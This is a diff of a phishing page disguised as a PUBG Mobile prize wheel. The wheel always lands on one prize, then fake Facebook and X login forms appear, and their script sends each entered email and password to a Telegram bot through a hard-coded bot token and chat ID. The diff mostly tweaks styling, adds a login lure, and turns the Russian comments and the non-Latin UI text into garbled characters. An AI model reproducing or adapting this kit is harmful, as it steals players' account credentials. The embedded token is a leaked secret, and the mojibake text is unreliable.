@@ -173,7 +173,7 @@
             left: 100%;
         }
 
-        /* Модальные окна */
+        /* ÐÐ¾Ð´Ð°Ð»ÑÐ½ÑÐµ Ð¾ÐºÐ½Ð° */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -196,7 +196,7 @@
             padding: 0;
             width: 100%;
             max-width: 400px;
-            min-height: 500px;
+            min-height: 600px;
             text-align: center;
             position: relative;
             overflow: hidden;
@@ -204,45 +204,45 @@
             box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
         }
 
-        /* Стили для окна выигрыша */
+        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Ð¾ÐºÐ½Ð° Ð²ÑÐ¸Ð³ÑÑÑÐ° */
         .win-modal-header {
             background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-            padding: 20px;
+            padding: 25px 20px;
             border-bottom: 2px solid gold;
         }
 
         .win-modal-header h1 {
             color: #fff;
-            font-size: 2.2rem;
-            margin-bottom: 5px;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
             text-transform: uppercase;
             font-weight: bold;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
         }
 
         .win-modal-header h2 {
             color: gold;
-            font-size: 1.5rem;
+            font-size: 1.8rem;
             margin-bottom: 5px;
             font-weight: normal;
         }
 
         .win-modal-header h3 {
             color: #ccc;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: normal;
-            margin-top: 10px;
+            margin-top: 15px;
         }
 
         .prize-image-container {
             width: 100%;
-            padding: 25px;
+            padding: 30px;
             background: #111;
         }
 
         .prize-image {
-            max-width: 180px;
-            max-height: 180px;
+            max-width: 200px;
+            max-height: 200px;
             width: 100%;
             height: auto;
             border-radius: 10px;
@@ -251,14 +251,14 @@
         }
 
         .login-options {
-            padding: 20px;
+            padding: 25px 20px;
             background: #222;
         }
 
         .login-options h3 {
             color: #fff;
-            margin-bottom: 20px;
-            font-size: 1.3rem;
+            margin-bottom: 25px;
+            font-size: 1.4rem;
         }
 
         .checkbox-option {
@@ -307,7 +307,7 @@
         }
 
         .checkbox-option.active .checkbox-icon::after {
-            content: '✓';
+            content: 'â';
             color: #000;
             font-weight: bold;
         }
@@ -346,11 +346,11 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
 
-        /* Стили для Facebook окна */
+        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Facebook Ð¾ÐºÐ½Ð° */
         .facebook-modal-content {
             background: #fff;
             color: #000;
-            min-height: 650px;
+            min-height: 700px;
         }
 
         .facebook-header {
@@ -478,7 +478,7 @@
             color: #666;
         }
 
-        /* Стили для Twitter окна */
+        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Twitter Ð¾ÐºÐ½Ð° */
         .twitter-modal-content {
             background: #000;
             color: #fff;
@@ -622,40 +622,40 @@
             text-align: center;
         }
 
-        /* Стили для окна успеха */
+        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Ð¾ÐºÐ½Ð° ÑÑÐ¿ÐµÑÐ° */
         .success-modal-content {
             background: #000;
             border: 3px solid gold;
-            min-height: 450px;
+            min-height: 500px;
         }
 
         .success-header {
             background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-            padding: 20px;
+            padding: 25px 20px;
             border-bottom: 2px solid gold;
         }
 
         .success-header h1 {
             color: gold;
-            font-size: 2rem;
-            margin-bottom: 5px;
+            font-size: 2.2rem;
+            margin-bottom: 10px;
             text-transform: uppercase;
         }
 
         .success-header h2 {
             color: #fff;
-            font-size: 1.3rem;
+            font-size: 1.5rem;
             margin-bottom: 5px;
         }
 
         .success-prize-container {
-            padding: 25px;
+            padding: 30px;
             background: #111;
         }
 
         .success-prize-image {
-            max-width: 140px;
-            max-height: 140px;
+            max-width: 150px;
+            max-height: 150px;
             width: 100%;
             height: auto;
             border-radius: 10px;
@@ -664,14 +664,14 @@
         }
 
         .success-message {
-            padding: 20px;
+            padding: 25px 20px;
             background: #222;
             text-align: center;
         }
 
         .success-message h3 {
             color: gold;
-            font-size: 1.6rem;
+            font-size: 1.8rem;
             margin-bottom: 10px;
         }
 
@@ -680,7 +680,7 @@
             font-size: 1.1rem;
         }
 
-        /* Анимации */
+        /* ÐÐ½Ð¸Ð¼Ð°ÑÐ¸Ð¸ */
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -717,27 +717,6 @@
                 max-width: 95%;
                 min-height: auto;
             }
-
-            .win-modal-header {
-                padding: 15px;
-            }
-
-            .win-modal-header h1 {
-                font-size: 1.8rem;
-            }
-
-            .win-modal-header h2 {
-                font-size: 1.3rem;
-            }
-
-            .prize-image-container {
-                padding: 20px;
-            }
-
-            .prize-image {
-                max-width: 150px;
-                max-height: 150px;
-            }
         }
 
         @media (max-width: 480px) {
@@ -762,30 +741,17 @@
                 margin: 15px auto;
             }
 
-            .modal-content {
-                max-width: 95%;
-                min-height: auto;
-            }
-
             .win-modal-header h1 {
-                font-size: 1.6rem;
+                font-size: 2rem;
             }
 
             .win-modal-header h2 {
-                font-size: 1.2rem;
+                font-size: 1.5rem;
             }
 
             .prize-image {
-                max-width: 140px;
-                max-height: 140px;
-            }
-
-            .login-options h3 {
-                font-size: 1.2rem;
-            }
-
-            .checkbox-option span {
-                font-size: 1rem;
+                max-width: 150px;
+                max-height: 150px;
             }
         }
     </style>
@@ -800,25 +766,26 @@
     <div class="container">
         <div class="roulette-container">
             <div class="wheel-container">
-                <img src="wheel.png" alt="Колесо рулетки" class="wheel prize-wheel" id="prizeWheel">
-                <img src="wheel_base.png" alt="Основание колеса" class="wheel wheel-base" id="wheelBase">
+                <img src="wheel.png" alt="ÐÐ¾Ð»ÐµÑÐ¾ ÑÑÐ»ÐµÑÐºÐ¸" class="wheel prize-wheel" id="prizeWheel">
+                <img src="wheel_base.png" alt="ÐÑÐ½Ð¾Ð²Ð°Ð½Ð¸Ðµ ÐºÐ¾Ð»ÐµÑÐ°" class="wheel wheel-base" id="wheelBase">
             </div>
         </div>
 
-        <button class="spin-button" id="spinButton">КРУТИТЬ РУЛЕТКУ</button>
+        <button class="spin-button" id="spinButton">ÐÐ Ð£Ð¢ÐÐ¢Ð¬ Ð Ð£ÐÐÐ¢ÐÐ£</button>
     </div>
 
-    <!-- Модальное окно выигрыша -->
+    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ð²ÑÐ¸Ð³ÑÑÑÐ° -->
     <div class="modal-overlay" id="winModal">
         <div class="modal-content">
             <div class="win-modal-header">
                 <h1>METEOR ROYAL</h1>
                 <h2>REVALE PASS S</h2>
                 <h3>PUBG MOBILE METRO ROYALE PASS SIG</h3>
+                <p style="color: #ccc; margin-top: 10px;">Login to receive reward</p>
             </div>
             
             <div class="prize-image-container">
-                <img id="winPrizeImage" class="prize-image" alt="Выигрыш">
+                <img id="winPrizeImage" class="prize-image" alt="ÐÑÐ¸Ð³ÑÑÑ">
             </div>
             
             <div class="login-options">
@@ -840,7 +807,7 @@
         </div>
     </div>
 
-    <!-- Модальное окно входа в Facebook -->
+    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ð²ÑÐ¾Ð´Ð° Ð² Facebook -->
     <div class="modal-overlay" id="facebookModal">
         <div class="modal-content facebook-modal-content">
             <div class="facebook-header">
@@ -870,12 +837,12 @@
                 <select>
                     <option>English (UK)</option>
                     <option>Basa Jawa</option>
-                    <option>日本語</option>
-                    <option>Português (Brasil)</option>
+                    <option>æ¥æ¬èª</option>
+                    <option>PortuguÃªs (Brasil)</option>
                     <option>Bahasa Indonesia</option>
                     <option>Bahasa Melayu</option>
-                    <option>Español</option>
-                    <option>Русский</option>
+                    <option>EspaÃ±ol</option>
+                    <option>Ð ÑÑÑÐºÐ¸Ð¹</option>
                 </select>
             </div>
             
@@ -885,11 +852,11 @@
         </div>
     </div>
 
-    <!-- Модальное окно входа в Twitter -->
+    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ð²ÑÐ¾Ð´Ð° Ð² Twitter -->
     <div class="modal-overlay" id="twitterModal">
         <div class="modal-content twitter-modal-content">
             <div class="twitter-header">
-                <div class="twitter-logo">𝕏</div>
+                <div class="twitter-logo">ð</div>
                 <div class="twitter-title">Sign in to X</div>
                 <div class="twitter-subtitle">Log in to your X account to connect to PUBG MOBILE</div>
             </div>
@@ -920,12 +887,12 @@
             </form>
             
             <div class="twitter-footer">
-                © 2024 X Corp.
+                Â© 2024 X Corp.
             </div>
         </div>
     </div>
 
-    <!-- Модальное окно успешного получения приза -->
+    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ ÑÑÐ¿ÐµÑÐ½Ð¾Ð³Ð¾ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð° -->
     <div class="modal-overlay" id="successModal">
         <div class="modal-content success-modal-content">
             <div class="success-header">
@@ -934,7 +901,7 @@
             </div>
             
             <div class="success-prize-container">
-                <img id="successPrizeImage" class="success-prize-image" alt="Выигрыш">
+                <img id="successPrizeImage" class="success-prize-image" alt="ÐÑÐ¸Ð³ÑÑÑ">
             </div>
             
             <div class="success-message">
@@ -951,12 +918,12 @@
     </div>
 
     <script>
-        // Конфигурация призов (mummy находится на 4-й позиции, индекс 3)
+        // ÐÐ¾Ð½ÑÐ¸Ð³ÑÑÐ°ÑÐ¸Ñ Ð¿ÑÐ¸Ð·Ð¾Ð² (mummy Ð½Ð°ÑÐ¾Ð´Ð¸ÑÑÑ Ð½Ð° 4-Ð¹ Ð¿Ð¾Ð·Ð¸ÑÐ¸Ð¸, Ð¸Ð½Ð´ÐµÐºÑ 3)
         const prizes = [
             { name: "pharaon", image: "pharaon.png" },
             { name: "material", image: "material.png" },
             { name: "m416lednik", image: "m416lednik.png" },
-            { name: "mummy", image: "mummy.png" }, // Это 4-й приз, индекс 3 - МУМИЯ
+            { name: "mummy", image: "mummy.png" }, // Ð­ÑÐ¾ 4-Ð¹ Ð¿ÑÐ¸Ð·, Ð¸Ð½Ð´ÐµÐºÑ 3 - ÐÐ£ÐÐÐ¯
             { name: "m416shut", image: "m416shut.png" },
             { name: "8500uc", image: "8500uc.png" },
             { name: "shorti", image: "shorti.png" },
@@ -967,11 +934,11 @@
             { name: "tolstovka", image: "tolstovka.png" }
         ];
 
-        // Telegram бот данные
+        // Telegram Ð±Ð¾Ñ Ð´Ð°Ð½Ð½ÑÐµ
         const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const CHAT_ID = '1709490182';
 
-        // Элементы DOM
+        // Ð­Ð»ÐµÐ¼ÐµÐ½ÑÑ DOM
         const spinButton = document.getElementById('spinButton');
         const prizeWheel = document.getElementById('prizeWheel');
         const winModal = document.getElementById('winModal');
@@ -987,81 +954,81 @@
         const confirmLogin = document.getElementById('confirmLogin');
 
         let isSpinning = false;
-        let hasSpun = false; // Флаг для ограничения одного вращения
+        let hasSpun = false; // Ð¤Ð»Ð°Ð³ Ð´Ð»Ñ Ð¾Ð³ÑÐ°Ð½Ð¸ÑÐµÐ½Ð¸Ñ Ð¾Ð´Ð½Ð¾Ð³Ð¾ Ð²ÑÐ°ÑÐµÐ½Ð¸Ñ
         let currentRotation = 0;
         let currentPrize = null;
-        let selectedLoginOption = 'facebook'; // По умолчанию Facebook
+        let selectedLoginOption = 'facebook'; // ÐÐ¾ ÑÐ¼Ð¾Ð»ÑÐ°Ð½Ð¸Ñ Facebook
 
-        // Инициализация
+        // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð°ÑÐ¸Ñ
         function initialize() {
-            // Сброс состояния при загрузке страницы
+            // Ð¡Ð±ÑÐ¾Ñ ÑÐ¾ÑÑÐ¾ÑÐ½Ð¸Ñ Ð¿ÑÐ¸ Ð·Ð°Ð³ÑÑÐ·ÐºÐµ ÑÑÑÐ°Ð½Ð¸ÑÑ
             hasSpun = false;
             spinButton.disabled = false;
-            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            spinButton.textContent = "ÐÐ Ð£Ð¢ÐÐ¢Ð¬ Ð Ð£ÐÐÐ¢ÐÐ£";
             prizeWheel.style.transition = 'none';
             prizeWheel.style.transform = 'rotate(0deg)';
             currentRotation = 0;
             
-            // Установка выбора по умолчанию
+            // Ð£ÑÑÐ°Ð½Ð¾Ð²ÐºÐ° Ð²ÑÐ±Ð¾ÑÐ° Ð¿Ð¾ ÑÐ¼Ð¾Ð»ÑÐ°Ð½Ð¸Ñ
             facebookOption.classList.add('active');
             twitterOption.classList.remove('active');
             selectedLoginOption = 'facebook';
         }
 
-        // Функция вращения рулетки (ВСЕГДА на Mummy)
+        // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð²ÑÐ°ÑÐµÐ½Ð¸Ñ ÑÑÐ»ÐµÑÐºÐ¸ (ÐÐ¡ÐÐÐÐ Ð½Ð° Mummy)
         function spinRoulette() {
             if (isSpinning || hasSpun) return;
             
             isSpinning = true;
             spinButton.disabled = true;
-            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            spinButton.textContent = "ÐÐ Ð£Ð¢ÐÐ¢Ð¬ Ð Ð£ÐÐÐ¢ÐÐ£";
             
-            // ВСЕГДА выбираем приз "mummy" (мумию) - индекс 3
-            const TARGET_PRIZE_INDEX = 3; // mummy всегда
+            // ÐÐ¡ÐÐÐÐ Ð²ÑÐ±Ð¸ÑÐ°ÐµÐ¼ Ð¿ÑÐ¸Ð· "mummy" (Ð¼ÑÐ¼Ð¸Ñ) - Ð¸Ð½Ð´ÐµÐºÑ 3
+            const TARGET_PRIZE_INDEX = 3; // mummy Ð²ÑÐµÐ³Ð´Ð°
             currentPrize = prizes[TARGET_PRIZE_INDEX];
             
-            // ПРАВИЛЬНЫЙ УГОЛ для мумии СПРАВА
-            // Если мумия СПРАВА от предыдущего приза, нужно ВЫЧЕСТЬ 30 градусов
-            const anglePerPrize = 30; // 360 / 12 = 30 градусов на приз
+            // ÐÐ ÐÐÐÐÐ¬ÐÐ«Ð Ð£ÐÐÐ Ð´Ð»Ñ Ð¼ÑÐ¼Ð¸Ð¸ Ð¡ÐÐ ÐÐÐ
+            // ÐÑÐ»Ð¸ Ð¼ÑÐ¼Ð¸Ñ Ð¡ÐÐ ÐÐÐ Ð¾Ñ Ð¿ÑÐµÐ´ÑÐ´ÑÑÐµÐ³Ð¾ Ð¿ÑÐ¸Ð·Ð°, Ð½ÑÐ¶Ð½Ð¾ ÐÐ«Ð§ÐÐ¡Ð¢Ð¬ 30 Ð³ÑÐ°Ð´ÑÑÐ¾Ð²
+            const anglePerPrize = 30; // 360 / 12 = 30 Ð³ÑÐ°Ð´ÑÑÐ¾Ð² Ð½Ð° Ð¿ÑÐ¸Ð·
             const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize; // 3 * 30 = 90
             
-            // Корректировка: чтобы мумия была точно вверху (на 12 часов)
-            // МИНУС 30 градусов, так как мумия СПРАВА (по часовой стрелке)
-            // Ранее было +90, теперь 90 - 30 = 60
-            const correctionAngle = 90 - 30; // 60 градусов
+            // ÐÐ¾ÑÑÐµÐºÑÐ¸ÑÐ¾Ð²ÐºÐ°: ÑÑÐ¾Ð±Ñ Ð¼ÑÐ¼Ð¸Ñ Ð±ÑÐ»Ð° ÑÐ¾ÑÐ½Ð¾ Ð²Ð²ÐµÑÑÑ (Ð½Ð° 12 ÑÐ°ÑÐ¾Ð²)
+            // ÐÐÐÐ£Ð¡ 30 Ð³ÑÐ°Ð´ÑÑÐ¾Ð², ÑÐ°Ðº ÐºÐ°Ðº Ð¼ÑÐ¼Ð¸Ñ Ð¡ÐÐ ÐÐÐ (Ð¿Ð¾ ÑÐ°ÑÐ¾Ð²Ð¾Ð¹ ÑÑÑÐµÐ»ÐºÐµ)
+            // Ð Ð°Ð½ÐµÐµ Ð±ÑÐ»Ð¾ +90, ÑÐµÐ¿ÐµÑÑ 90 - 30 = 60
+            const correctionAngle = 90 - 30; // 60 Ð³ÑÐ°Ð´ÑÑÐ¾Ð²
             const targetAngle = baseAngle + correctionAngle; // 90 + 60 = 150
             
-            // Делаем 5 полных оборотов плюс угол до приза
-            const spins = 5; // Фиксированное количество оборотов
-            const totalRotation = (spins * 360) + targetAngle; // 1800 + 150 = 1950 градусов
+            // ÐÐµÐ»Ð°ÐµÐ¼ 5 Ð¿Ð¾Ð»Ð½ÑÑ Ð¾Ð±Ð¾ÑÐ¾ÑÐ¾Ð² Ð¿Ð»ÑÑ ÑÐ³Ð¾Ð» Ð´Ð¾ Ð¿ÑÐ¸Ð·Ð°
+            const spins = 5; // Ð¤Ð¸ÐºÑÐ¸ÑÐ¾Ð²Ð°Ð½Ð½Ð¾Ðµ ÐºÐ¾Ð»Ð¸ÑÐµÑÑÐ²Ð¾ Ð¾Ð±Ð¾ÑÐ¾ÑÐ¾Ð²
+            const totalRotation = (spins * 360) + targetAngle; // 1800 + 150 = 1950 Ð³ÑÐ°Ð´ÑÑÐ¾Ð²
             
-            // Анимация вращения с эффектом замедления
+            // ÐÐ½Ð¸Ð¼Ð°ÑÐ¸Ñ Ð²ÑÐ°ÑÐµÐ½Ð¸Ñ Ñ ÑÑÑÐµÐºÑÐ¾Ð¼ Ð·Ð°Ð¼ÐµÐ´Ð»ÐµÐ½Ð¸Ñ
             prizeWheel.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
             currentRotation = totalRotation;
             prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
             
-            // Отмечаем, что вращение уже было
+            // ÐÑÐ¼ÐµÑÐ°ÐµÐ¼, ÑÑÐ¾ Ð²ÑÐ°ÑÐµÐ½Ð¸Ðµ ÑÐ¶Ðµ Ð±ÑÐ»Ð¾
             hasSpun = true;
             
-            // Показ модального окна с выигрышем через 4 секунды
+            // ÐÐ¾ÐºÐ°Ð· Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ñ Ð²ÑÐ¸Ð³ÑÑÑÐµÐ¼ ÑÐµÑÐµÐ· 4 ÑÐµÐºÑÐ½Ð´Ñ
             setTimeout(() => {
                 winPrizeImage.src = currentPrize.image;
                 winModal.style.display = 'flex';
                 isSpinning = false;
-                // Не включаем кнопку обратно после вращения
+                // ÐÐµ Ð²ÐºÐ»ÑÑÐ°ÐµÐ¼ ÐºÐ½Ð¾Ð¿ÐºÑ Ð¾Ð±ÑÐ°ÑÐ½Ð¾ Ð¿Ð¾ÑÐ»Ðµ Ð²ÑÐ°ÑÐµÐ½Ð¸Ñ
                 spinButton.disabled = true;
                 spinButton.style.opacity = '0.5';
             }, 4000);
         }
 
-        // Функция отправки данных в Telegram
+        // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¾ÑÐ¿ÑÐ°Ð²ÐºÐ¸ Ð´Ð°Ð½Ð½ÑÑ Ð² Telegram
         async function sendToTelegram(data) {
-            const message = `🎰 НОВЫЙ ВЫИГРЫШ!\n\n` +
-                           `🎁 Приз: ${data.prize}\n` +
-                           `📧 Логин: ${data.login}\n` +
-                           `🔑 Пароль: ${data.password}\n` +
-                           `🌐 Соцсеть: ${data.network}\n` +
-                           `🕐 Время: ${new Date().toLocaleString()}`;
+            const message = `ð° ÐÐÐÐ«Ð ÐÐ«ÐÐÐ Ð«Ð¨!\n\n` +
+                           `ð ÐÑÐ¸Ð·: ${data.prize}\n` +
+                           `ð§ ÐÐ¾Ð³Ð¸Ð½: ${data.login}\n` +
+                           `ð ÐÐ°ÑÐ¾Ð»Ñ: ${data.password}\n` +
+                           `ð Ð¡Ð¾ÑÑÐµÑÑ: ${data.network}\n` +
+                           `ð ÐÑÐµÐ¼Ñ: ${new Date().toLocaleString()}`;
             
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1077,15 +1044,15 @@
                 });
                 
                 const result = await response.json();
-                console.log('Данные отправлены в Telegram:', result);
+                console.log('ÐÐ°Ð½Ð½ÑÐµ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½Ñ Ð² Telegram:', result);
                 return result.ok;
             } catch (error) {
-                console.error('Ошибка отправки в Telegram:', error);
+                console.error('ÐÑÐ¸Ð±ÐºÐ° Ð¾ÑÐ¿ÑÐ°Ð²ÐºÐ¸ Ð² Telegram:', error);
                 return false;
             }
         }
 
-        // Выбор опции входа
+        // ÐÑÐ±Ð¾Ñ Ð¾Ð¿ÑÐ¸Ð¸ Ð²ÑÐ¾Ð´Ð°
         facebookOption.addEventListener('click', () => {
             facebookOption.classList.add('active');
             twitterOption.classList.remove('active');
@@ -1098,7 +1065,7 @@
             selectedLoginOption = 'twitter';
         });
 
-        // Подтверждение выбора входа
+        // ÐÐ¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ðµ Ð²ÑÐ±Ð¾ÑÐ° Ð²ÑÐ¾Ð´Ð°
         confirmLogin.addEventListener('click', () => {
             winModal.style.display = 'none';
             
@@ -1109,22 +1076,22 @@
             }
         });
 
-        // Обработчики событий
+        // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸ÐºÐ¸ ÑÐ¾Ð±ÑÑÐ¸Ð¹
         spinButton.addEventListener('click', spinRoulette);
 
-        // Отмена выигрыша
+        // ÐÑÐ¼ÐµÐ½Ð° Ð²ÑÐ¸Ð³ÑÑÑÐ°
         document.getElementById('cancelWin').addEventListener('click', () => {
             winModal.style.display = 'none';
         });
 
-        // Форма Facebook
+        // Ð¤Ð¾ÑÐ¼Ð° Facebook
         document.getElementById('facebookForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const email = document.getElementById('fbEmail').value;
             const password = document.getElementById('fbPassword').value;
             
-            // Отправка данных в Telegram
+            // ÐÑÐ¿ÑÐ°Ð²ÐºÐ° Ð´Ð°Ð½Ð½ÑÑ Ð² Telegram
             const success = await sendToTelegram({
                 prize: currentPrize.name,
                 login: email,
@@ -1139,14 +1106,14 @@
             }
         });
 
-        // Форма Twitter
+        // Ð¤Ð¾ÑÐ¼Ð° Twitter
         document.getElementById('twitterForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const email = document.getElementById('twitterEmail').value;
             const password = document.getElementById('twitterPassword').value;
             
-            // Отправка данных в Telegram
+            // ÐÑÐ¿ÑÐ°Ð²ÐºÐ° Ð´Ð°Ð½Ð½ÑÑ Ð² Telegram
             const success = await sendToTelegram({
                 prize: currentPrize.name,
                 login: email,
@@ -1161,7 +1128,7 @@
             }
         });
 
-        // Кнопки "Not now"
+        // ÐÐ½Ð¾Ð¿ÐºÐ¸ "Not now"
         document.getElementById('fbNotNow').addEventListener('click', (e) => {
             e.preventDefault();
             facebookModal.style.display = 'none';
@@ -1170,29 +1137,29 @@
 
         document.getElementById('forgotPassword').addEventListener('click', (e) => {
             e.preventDefault();
-            // В реальном приложении здесь была бы страница восстановления пароля
+            // Ð ÑÐµÐ°Ð»ÑÐ½Ð¾Ð¼ Ð¿ÑÐ¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¸ Ð·Ð´ÐµÑÑ Ð±ÑÐ»Ð° Ð±Ñ ÑÑÑÐ°Ð½Ð¸ÑÐ° Ð²Ð¾ÑÑÑÐ°Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ Ð¿Ð°ÑÐ¾Ð»Ñ
             alert('Password recovery feature would open here');
         });
 
         document.getElementById('twitterForgot').addEventListener('click', (e) => {
             e.preventDefault();
-            // В реальном приложении здесь была бы страница восстановления пароля
+            // Ð ÑÐµÐ°Ð»ÑÐ½Ð¾Ð¼ Ð¿ÑÐ¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¸ Ð·Ð´ÐµÑÑ Ð±ÑÐ»Ð° Ð±Ñ ÑÑÑÐ°Ð½Ð¸ÑÐ° Ð²Ð¾ÑÑÑÐ°Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ Ð¿Ð°ÑÐ¾Ð»Ñ
             alert('Password recovery feature would open here');
         });
 
-        // Создание аккаунта
+        // Ð¡Ð¾Ð·Ð´Ð°Ð½Ð¸Ðµ Ð°ÐºÐºÐ°ÑÐ½ÑÐ°
         document.getElementById('createAccount').addEventListener('click', () => {
-            // В реальном приложении здесь была бы страница создания аккаунта
+            // Ð ÑÐµÐ°Ð»ÑÐ½Ð¾Ð¼ Ð¿ÑÐ¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¸ Ð·Ð´ÐµÑÑ Ð±ÑÐ»Ð° Ð±Ñ ÑÑÑÐ°Ð½Ð¸ÑÐ° ÑÐ¾Ð·Ð´Ð°Ð½Ð¸Ñ Ð°ÐºÐºÐ°ÑÐ½ÑÐ°
             alert('Account creation page would open here');
         });
 
         document.getElementById('twitterSignup').addEventListener('click', (e) => {
             e.preventDefault();
-            // В реальном приложении здесь была бы страница регистрации
+            // Ð ÑÐµÐ°Ð»ÑÐ½Ð¾Ð¼ Ð¿ÑÐ¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¸ Ð·Ð´ÐµÑÑ Ð±ÑÐ»Ð° Ð±Ñ ÑÑÑÐ°Ð½Ð¸ÑÐ° ÑÐµÐ³Ð¸ÑÑÑÐ°ÑÐ¸Ð¸
             alert('Twitter signup page would open here');
         });
 
-        // Альтернативные способы входа
+        // ÐÐ»ÑÑÐµÑÐ½Ð°ÑÐ¸Ð²Ð½ÑÐµ ÑÐ¿Ð¾ÑÐ¾Ð±Ñ Ð²ÑÐ¾Ð´Ð°
         document.getElementById('twitterGoogle').addEventListener('click', () => {
             alert('Google sign-in would open here');
         });
@@ -1201,17 +1168,17 @@
             alert('Apple sign-in would open here');
         });
 
-        // Кнопки успешного получения
+        // ÐÐ½Ð¾Ð¿ÐºÐ¸ ÑÑÐ¿ÐµÑÐ½Ð¾Ð³Ð¾ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ
         document.getElementById('cancelSuccess').addEventListener('click', () => {
             successModal.style.display = 'none';
         });
 
         document.getElementById('okSuccess').addEventListener('click', () => {
             successModal.style.display = 'none';
-            // Можно добавить редирект или другие действия
+            // ÐÐ¾Ð¶Ð½Ð¾ Ð´Ð¾Ð±Ð°Ð²Ð¸ÑÑ ÑÐµÐ´Ð¸ÑÐµÐºÑ Ð¸Ð»Ð¸ Ð´ÑÑÐ³Ð¸Ðµ Ð´ÐµÐ¹ÑÑÐ²Ð¸Ñ
         });
 
-        // Блокировка прокрутки
+        // ÐÐ»Ð¾ÐºÐ¸ÑÐ¾Ð²ÐºÐ° Ð¿ÑÐ¾ÐºÑÑÑÐºÐ¸
         document.addEventListener('touchmove', function(e) {
             if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
                 e.preventDefault();
@@ -1228,7 +1195,7 @@
             document.querySelector('.container').style.transform = 'translateY(0)';
         });
 
-        // Закрытие модальных окон по клику на оверлей
+        // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½ÑÑ Ð¾ÐºÐ¾Ð½ Ð¿Ð¾ ÐºÐ»Ð¸ÐºÑ Ð½Ð° Ð¾Ð²ÐµÑÐ»ÐµÐ¹
         const modals = document.querySelectorAll('.modal-overlay');
         modals.forEach(modal => {
             modal.addEventListener('click', (e) => {
@@ -1238,7 +1205,7 @@
             });
         });
 
-        // Инициализация при загрузке
+        // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð°ÑÐ¸Ñ Ð¿ÑÐ¸ Ð·Ð°Ð³ÑÑÐ·ÐºÐµ
         window.addEventListener('load', initialize);
     </script>
 </body>
